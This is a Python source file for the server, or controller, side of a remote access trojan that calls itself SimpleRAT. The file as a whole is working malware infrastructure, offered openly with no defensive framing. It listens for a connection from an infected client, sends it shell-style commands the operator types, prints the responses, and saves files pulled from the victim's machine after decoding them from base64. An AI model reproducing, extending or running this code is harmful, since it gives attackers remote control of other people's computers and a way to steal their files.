# -*- coding: utf-8 -*-
# @Author : Alysif
# @Github : https://github.com/alysif/SimpleRAT
import socket
import os
import base64
import argparse
import sys
from colorama import Fore, init

init() # Colorama Init
parser = argparse.ArgumentParser(description="RAT Server command line") # Command line arguments description
parser.add_argument("-r", "--host", help="Server host to listen connections", required=True) # Host 
parser.add_argument("-p", "--port", help="Server port to listen connections", required=True) # Port
args = vars(parser.parse_args())

def Main(host, port):
    print("[{}${}] {}Welcome, now creating folder and server!{}".format(Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.WHITE))
    #CreateDownloadsDirectory
    if(not os.path.isdir('downloads')):
        print('[{}+{}] Folder created'.format(Fore.GREEN, Fore.WHITE))
        os.mkdir('downloads')
    downloads_path = os.path.join(os.getcwd(), 'downloads')

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    print("[{}+{}] {}Server listen on {}{}{}:{}{}{}".format(Fore.GREEN, Fore.WHITE, Fore.RED, Fore.GREEN, host, Fore.YELLOW, Fore.CYAN, port, Fore.WHITE))
    server.listen(1)
    client, addresss = server.accept()
    while True:
        # command
        command = input("[{}-{}] {}SERVER SEND {}>{} ".format(Fore.CYAN, Fore.WHITE, Fore.RED, Fore.GREEN, Fore.WHITE))
        client.send(command.encode())
        # Data
        data = client.recv(1024)
        if(not data): break
        # Commands
        if(command.startswith("file")):
            with open(os.path.join(downloads_path, command.split(' ')[1]), 'wb') as file:
                data = base64.b64decode(data)
                file.write(data)
                file.close()
            print("[{}+{}] {}File saved{}".format(Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.WHITE))
        elif(command.startswith("exit")):
            client.close()
            server.close()
            break
        else:
            print("[{}+{}] {}Client response:{}\n".format(Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.WHITE)+str(data.decode()))

if __name__ == "__main__":
    try:
        Main(args['host'], int(args['port']))
    except KeyboardInterrupt:
        sys.exit()